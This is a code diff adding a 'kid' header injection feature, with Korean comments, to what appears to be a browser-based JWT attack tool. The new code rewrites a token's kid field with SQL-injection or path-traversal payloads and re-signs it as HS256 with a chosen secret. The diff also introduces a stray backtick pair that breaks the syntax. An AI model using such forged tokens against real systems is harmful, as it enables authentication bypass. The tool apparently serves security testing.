@@ -46,7 +46,7 @@ jQuery(function () {
         fileReader.onload = function () {
             controller.load_dict(fileReader.result).then(result => {
                 console.log(result)
-            })
+            })``
         }
 
         fileReader.onprogress = (event) => {
@@ -266,6 +266,106 @@ jQuery(function () {
         return jwtHelper.generateConfusionAttacks(header, payload, publicKey)
     }
 
+    // kid Injection Attack
+    $("#kid_injection_menu_btn").on('click', function (e) {
+        // 1. 메인 편집기의 현재 토큰을 가져와 모달 안의 두 'Original Token' 필드에 채워넣습니다.
+        let currentToken = editorToken.getDoc().getValue();
+        $("#kid_sqli_token").val(currentToken);
+        $("#kid_path_token").val(currentToken);
+
+        // 2. 이전에 생성된 토큰이 있다면 결과 창을 비웁니다.
+        $("#kid_sqli_result").val("");
+        $("#kid_path_result").val("");
+
+        // 3. 모달을 엽니다.
+        $("#kid_injection_dlg").modal({
+            onVisible: function () {
+                // 4. 모달이 열릴 때 Semantic UI 탭 기능을 활성화합니다.
+                $('#kid_injection_dlg .menu .item').tab();
+            }
+        }).modal('show');
+    });
+
+    // 'kid' 헤더를 조작하는 헬퍼 함수
+    function generateKidToken(token, kidPayload) {
+        try {
+            // 1. 원본 토큰을 디코딩합니다.
+            let { jwtToken, decodedToken } = jwtHelper.checkToken(token);
+            if (!decodedToken) throw new Error("Invalid original token.");
+
+            let jwt = JSON.parse(decodedToken);
+
+            // 2. 헤더의 'kid' 값을 공격용 페이로드로 덮어씁니다.
+            jwt['header']['kid'] = kidPayload;
+
+            // 3. 헤더만 Base64URL 형식으로 다시 인코딩합니다.
+            // (이 도구는 헤더 조작만 돕고, 서명은 사용자가 메인 화면에서 직접 처리해야 함을 가정)
+            let newHeader = btoa(JSON.stringify(jwt['header']))
+                .replace(/=/g, '')
+                .replace(/\+/g, '-')
+                .replace(/\//g, '_');
+
+            // 4. 원본 페이로드와 원본 서명을 그대로 붙여서 반환합니다.
+            let parts = token.split('.');
+            if (parts.length < 2) throw new Error("Invalid token format.");
+
+            // 원본 서명(parts[2])이 없는 경우(예: alg:none)도 처리
+            let signature = parts[2] ? parts[2] : "";
+            return newHeader + "." + parts[1] + "." + signature;
+
+        } catch (err) {
+            // 오류 발생 시 메시지 반환
+            return "Error: " + err.message;
+        }
+    }
+
+    // SQLi 탭의 'Generate Token' 버튼 클릭 시
+    $("#kid_sqli_generate").on('click', function (e) {
+        e.preventDefault(); // 폼 자동 제출 방지
+        let token = $("#kid_sqli_token").val();
+        let payload = $("#kid_sqli_payload").val();
+
+        let newJwt = generateKidToken(token, payload);
+        $("#kid_sqli_result").val(newJwt);
+    });
+
+    $("#kid_path_generate").on('click', function (e) {
+        e.preventDefault(); 
+
+        let token = $("#kid_path_token").val();
+        let kidPayload = $("#kid_path_payload").val();
+        let secretKey = $("#kid_path_secret").val(); 
+
+        try {
+            let { jwtToken, decodedToken } = jwtHelper.checkToken(token);
+            if (!decodedToken) throw new Error("Invalid original token.");
+
+            let jwt = JSON.parse(decodedToken);
+
+            jwt['header']['kid'] = kidPayload;
+            jwt['header']['alg'] = 'HS256'; 
+
+            let headerString = JSON.stringify(jwt['header']);
+            let payloadString = JSON.stringify(jwt['payload']);
+
+            signToken(headerString, payloadString, secretKey, { "public": "", "private": "" })
+                .then(newJwt => {
+                    $("#kid_path_result").val(newJwt);
+
+                    editorToken.getDoc().setValue(newJwt);
+
+                    $("#alg_secret").val(secretKey);
+
+                    $("#kid_injection_dlg").modal('hide');
+                })
+                .catch(err => {
+                    $("#kid_path_result").val("Error: ".concat(err.message));
+                });
+
+        } catch (err) {
+            $("#kid_path_result").val("Error: " + err.message);
+        }
+    });
 
 
     //JWK injection attak
